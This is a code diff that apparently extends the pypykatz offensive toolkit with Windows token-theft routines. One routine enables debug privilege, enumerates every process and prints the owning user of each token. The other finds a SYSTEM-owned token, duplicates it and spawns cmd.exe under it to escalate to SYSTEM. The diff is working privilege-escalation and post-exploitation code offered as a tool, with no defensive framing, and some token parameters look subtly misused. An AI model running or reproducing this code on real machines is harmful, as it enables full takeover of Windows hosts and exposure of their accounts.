@@ -1,7 +1,8 @@
 
+import ctypes
 from pypykatz.commons.readers.local.common.advapi32 import *
 from pypykatz.commons.readers.local.common.psapi import EnumProcesses
-from pypykatz.commons.readers.local.common.kernel32 import OpenProcess, CloseHandle
+from pypykatz.commons.readers.local.common.kernel32 import OpenProcess, CloseHandle, STARTUPINFOW
 from pypykatz.commons.readers.local.common.privileges import RtlAdjustPrivilege
 from pypykatz.commons.readers.local.common.privileges_types import PrivilegeValues
 
@@ -36,12 +37,54 @@ PROCESS_ALL_ACCESS               = (PROCESS_CREATE_PROCESS
                                   | PROCESS_VM_READ
                                   | PROCESS_VM_WRITE
                                   | SYNCHRONIZE)
+								  
+CREATE_NEW_CONSOLE        = 0x00000010
+
+def list_users():
+	#LookupAccountSidA
+	try:
+		RtlAdjustPrivilege(PrivilegeValues.SE_DEBUG.value)
+	except Exception as e:
+		logger.error('Failed to obtain SE_DEBUG privilege!')
+		raise e
+		
+	for pid in EnumProcesses():
+		print(pid)
+		proc_handle = None
+		try:
+			proc_handle = OpenProcess(PROCESS_QUERY_INFORMATION, False, pid)
+			print('Proc handle for PID %s is: %s' % (proc_handle, pid))
+		except Exception as e:
+			print('Failed to open process pid %s Reason: %s' % (pid, str(e)))
+			continue
+		
+		else:
+			token_handle = None
+			try:
+				token_handle = OpenProcessToken(proc_handle, DesiredAccess = tokenprivs)
+			except Exception as e:
+				print('Failed get token from process pid %s Reason: %s' % (pid, str(e)))
+				continue
+			else:
+				
+				ptr_sid = GetTokenInformation_sid(token_handle)
+				#print('Token for PID %s has SID of %s' % (pid, sid))
+				name, domain, use = LookupAccountSidW(None, ptr_sid)
+				print('%s:%s:%s' % (name, domain, use))
+					
+			finally:
+				if token_handle is not None:
+					CloseHandle(token_handle)
+		
+		finally:
+			if proc_handle is not None:
+				CloseHandle(proc_handle)
 
 def getsystem_token():
 	try:
 		RtlAdjustPrivilege(PrivilegeValues.SE_DEBUG.value)
 	except Exception as e:
-		logger.error('Failed to obtain SE_BACKUP privilege! Registry dump will not work! Reason: %s' % str(e))
+		logger.error('Failed to obtain SE_DEBUG privilege!')
 		raise e
 			
 	
@@ -64,10 +107,62 @@ def getsystem_token():
 				continue
 			else:
 				
-				sid = GetTokenInformation(token_handle, TokenUser)
+				ptr_sid = GetTokenInformation_sid(token_handle)
+				sid = ConvertSidToStringSidA(ptr_sid)
 				print('Token for PID %s has SID of %s' % (pid, sid))
 				
-				
+				if sid == 'S-1-5-18':
+					print('Found SYSTEM token in PID %s ' % pid)
+					print('Duplicating token....')
+					#for creating a new process, the input params need to be a bit modified!
+					#cloned_system_token = DuplicateTokenEx(token_handle, 
+					#										dwDesiredAccess = TOKEN_QUERY | TOKEN_IMPERSONATE, 
+					#										lpTokenAttributes = None, 
+					#										ImpersonationLevel = SecurityDelegation, 
+					#										TokenType = TokenImpersonation)
+					
+					cloned_system_token = DuplicateTokenEx(
+						token_handle, 
+						dwDesiredAccess = TOKEN_ALL_ACCESS, 
+						lpTokenAttributes = None, 
+						ImpersonationLevel = SecurityImpersonation, 
+						TokenType = SecurityImpersonation
+					)
+					print('Setting token to current thread...')
+					try:
+						SW_SHOW = 5
+						STARTF_USESHOWWINDOW = 0x00000001
+						
+						#SetThreadToken(cloned_system_token)
+						lpStartupInfo			  = STARTUPINFOW()
+						lpStartupInfo.cb		   = ctypes.sizeof(STARTUPINFOW)
+						lpStartupInfo.lpReserved   = 0
+						lpStartupInfo.lpDesktop	= 0
+						lpStartupInfo.lpTitle	  = 0
+						lpStartupInfo.dwFlags	  = STARTF_USESHOWWINDOW
+						lpStartupInfo.cbReserved2  = 0
+						lpStartupInfo.lpReserved2  = 0
+						lpStartupInfo.wShowWindow  = SW_SHOW
+						
+						
+						
+						CreateProcessWithTokenW(
+							hToken = cloned_system_token, 
+							dwLogonFlags = LOGON_NETCREDENTIALS_ONLY, 
+							lpApplicationName = None, 
+							lpCommandLine = 'C:\\Windows\\system32\\cmd.exe', 
+							dwCreationFlags = CREATE_NEW_CONSOLE, 
+							lpEnvironment = None, 
+							lpCurrentDirectory = None, 
+							lpStartupInfo = lpStartupInfo
+						)
+					except Exception as e:
+						print('Failed changing the thread token. Reason: %s' % e)
+						continue
+					else:
+						print('Success! Now we should be SYSTEM!')
+						return
+					
 			finally:
 				if token_handle is not None:
 					CloseHandle(token_handle)
@@ -77,4 +172,5 @@ def getsystem_token():
 				CloseHandle(proc_handle)
 	
 if __name__ == '__main__':
-	getsystem_token()
+	#getsystem_token()
+	list_users()
